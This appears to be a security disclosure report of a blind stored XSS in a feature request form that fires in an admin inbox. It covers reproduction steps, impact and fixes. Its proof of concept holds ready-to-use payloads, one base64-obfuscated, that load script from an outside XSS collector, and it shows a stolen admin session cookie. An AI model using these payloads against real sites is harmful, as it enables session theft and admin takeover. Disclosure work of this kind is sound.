## Title
Blind XSS in Feature Request Submission Form - FeatureBoard

## Description
**Affected URL:** https://featureboard.pwnedbox.site/index.php#submit (triggers on https://featureboard.pwnedbox.site/admin/index.php)

A Blind Cross-Site Scripting (XSS) vulnerability exists in the feature request submission form on `featureboard.pwnedbox.site`. Input submitted in the **Feature title** and **Your name** fields (as well as **What would you like to see?**) is stored without HTML encoding and renders directly in the DOM when an administrator views the feedback inbox in the backend (`/admin/index.php`). Because the script executes inside an authenticated admin session and `PHPSESSID` lacks the `HttpOnly` flag, an attacker can exfiltrate the administrator's session cookie and compromise the admin panel.

## Steps to Reproduce
1. Go to `https://featureboard.pwnedbox.site/index.php#submit`, fill in the required fields with a Blind XSS payload in **Feature title**, **What would you like to see?**, and **Your name**, and click **Publish request**.
2. Log in to the admin panel (`https://featureboard.pwnedbox.site/admin/index.php`).
3. Observe the payload execute immediately upon loading the feedback inbox, sending an out-of-band callback with the admin's `PHPSESSID` cookie and page details.

## POC (Proof of Concept)
**Injection Endpoint:** `https://featureboard.pwnedbox.site/index.php#submit` (`Feature title`, `Your name`, and `What would you like to see?` fields)

**Trigger Endpoint:** `https://featureboard.pwnedbox.site/admin/index.php`

**Payload:**
```html
"><script src=[https://xss.report/c/havemercy](https://xss.report/c/havemercy)></script>
```
*(Alternative payload submitted in description: `"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL3JhcGlkbmV3dDYzMTAxIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61; onerror=eval(atob(this.id))>`)*

**Out-of-Band Callback Data Captured:**
- **Triggered URI:** `https://featureboard.pwnedbox.site/admin/index.php`
- **Referrer:** `https://featureboard.pwnedbox.site/admin/login.php`
- **Exfiltrated Session Cookie:** `PHPSESSID=6dd044507ba2b28c189b08754021ba08`

**Visual Evidence:**
- Feature submission form on `featureboard.pwnedbox.site/index.php#submit` with the Blind XSS payloads entered in **Feature title**, **What would you like to see?**, and **Your name**.
  <img width="1015" height="925" alt="image" src="https://github.com/user-attachments/assets/12499ce2-9458-4f67-a579-e4567338f119" /><br><br>

- Admin feedback inbox (`/admin/index.php`) rendering the injected payloads directly in the **REQUEST** and **SUBMITTER** columns (`">`), alongside Browser Storage showing `PHPSESSID` with `HttpOnly` set to `false`.
  <img width="1907" height="935" alt="image" src="https://github.com/user-attachments/assets/ea2dadcf-4f1b-46e9-9929-c8334575582f" /><br><br>

- Blind XSS collector report confirming execution on `/admin/index.php` and capturing the admin's `PHPSESSID` cookie and screenshot.
  <img width="1655" height="1082" alt="image" src="https://github.com/user-attachments/assets/db00f48e-d413-4bad-a23d-4e8390b49ad8" /><br>


## Impact
Because the payload executes automatically as soon as an administrator opens the feedback inbox without even needing to click into an individual item:
- **Admin Account Takeover:** Attackers can steal the administrator's `PHPSESSID` cookie and hijack their active session.
- **Unauthorized Data Access:** Full access to view, triage, or modify all submitted feature requests, community votes, and discussions.
- **Persistent Compromise:** Attackers can use the hijacked admin session to manipulate feature statuses (`Under Review`, `Planned`, `In Progress`, `Shipped`) or make unauthorized changes across the application.

## Remediation
1. **Encode Output:** Apply `htmlspecialchars($input, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8')` to all user-supplied feature request fields (`Feature title`, `Your name`, and description) before rendering them in `/admin/index.php` and the public board.
2. **Protect Session Cookies:** Set the `HttpOnly`, `Secure`, and `SameSite=Strict` flags on `PHPSESSID` so JavaScript cannot access session tokens via `document.cookie`.
3. **Add a Content Security Policy (CSP):** Enforce a strict CSP header on `/admin/` pages (e.g., `default-src 'self'; script-src 'self';`) to block unauthorized external script sources and inline event handlers.
